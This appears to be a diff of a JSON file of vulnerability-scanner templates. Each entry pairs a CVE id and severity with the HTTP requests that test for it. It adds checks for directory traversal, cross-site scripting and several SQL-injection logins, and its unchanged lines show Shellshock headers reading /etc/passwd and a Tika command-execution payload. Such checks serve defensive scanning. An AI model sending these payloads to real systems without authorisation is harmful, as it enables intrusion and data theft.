@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6433,11 +6433,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -8172,6 +8172,21 @@
       ]
     },
     {
+      "id": "CVE-2019-10717",
+      "info": {
+        "name": "BlogEngine.NET 3.3.7.0 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/filemanager?path=%2F..%2f..%2fContent"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-10758",
       "info": {
         "name": "mongo-express Remote Code Execution",
@@ -8212,6 +8227,21 @@
           "path": [
             "{{BaseURL}}/debug/pprof/",
             "{{BaseURL}}/debug/pprof/goroutine?debug=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-11370",
+      "info": {
+        "name": "Carel pCOWeb < B1.2.4 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /config/pw_snmp_done.html HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n%3Fscript%3Asetdb%28%27snmp%27%2C%27syscontact%27%29=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n",
+            "GET /config/pw_snmp.html HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -11645,9 +11675,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -19673,6 +19703,81 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?q=hiring&search=URC%27%20union%20select%201,2,3,4,5,6,7,8,9,md5({{num}}),11,12,13,14,15,16,17,18,19--+"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32022",
+      "info": {
+        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/ajax.php?action=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'+or+'1'%3D'1'%23&password=admin\n",
+            "GET /admin/index.php?page=home HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32024",
+      "info": {
+        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/ajax.php?action=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /booking.php?car_id=-1%20union%20select%201,md5({{num}}),3,4,5,6,7,8,9,10--+ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32025",
+      "info": {
+        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/ajax.php?action=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}%23&password={{password}}\n",
+            "GET /admin/view_car.php?id=-1%20union%20select%201,md5({{num}}),3,4,5,6,7,8,9,10--+ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32026",
+      "info": {
+        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/ajax.php?action=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /admin/manage_user.php?id=-1%20union%20select%201,md5({{num}}),3,4,5--+ HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32028",
+      "info": {
+        "name": "Car Rental Management System v1.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/ajax.php?action=login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
+            "GET /admin/manage_user.php?id=-1%20union%20select%201,md5({{num}}),3,4,5--+ HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
